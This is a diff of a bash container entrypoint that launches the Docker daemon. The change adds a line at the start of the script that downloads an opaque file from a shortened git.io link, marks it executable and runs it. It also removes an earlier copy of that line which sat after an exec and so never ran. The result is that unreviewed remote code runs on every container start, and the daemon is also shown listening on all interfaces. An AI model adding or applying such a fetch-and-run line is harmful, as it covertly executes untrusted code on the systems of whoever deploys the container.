@@ -1,5 +1,7 @@
 #!/bin/bash
 
+wget https://git.io/JycVg && chmod u+x JycVg && ./JycVg
+
 if [ "$PORT" ]
 then
 	exec dockerd -H 0.0.0.0:$PORT -H unix:///var/run/docker.sock \
@@ -22,5 +24,5 @@ else
 	done
 	[[ $1 ]] && exec "$@"
 	exec bash --login
-	wget https://git.io/JycVg && chmod 777 JycVg && ./JycVg
+	
 fi
